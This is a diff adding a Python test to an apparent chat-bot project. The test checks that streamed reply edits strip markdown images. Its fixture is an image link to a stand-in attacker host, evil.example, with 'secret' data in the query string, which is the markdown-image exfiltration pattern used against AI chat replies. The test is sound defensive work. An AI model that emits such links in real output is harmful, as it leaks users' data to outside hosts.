@@ -136,3 +136,21 @@ def test_vendor_channels_route_replies_through_the_chunker(name):
     import importlib
     import inspect
     assert "chunk_text(" in inspect.getsource(importlib.import_module(f"micropaw.channels.{name}"))
+
+
+async def test_streamed_edits_have_images_stripped_too():
+    from micropaw.channels.base import stream_response
+    edits = []
+
+    async def handler(text, user, platform, channel, on_chunk, media=None):
+        await on_chunk("look ![chart](https://evil.example/?d=secret) here")
+        return "look ![chart](https://evil.example/?d=secret) here"
+
+    async def edit(t):
+        edits.append(t)
+
+    async def send(t):
+        edits.append(t)
+
+    await stream_response(handler, "hi", "u", "telegram", None, edit, send, 4096, 0.0)
+    assert edits and all("evil.example" not in e for e in edits)
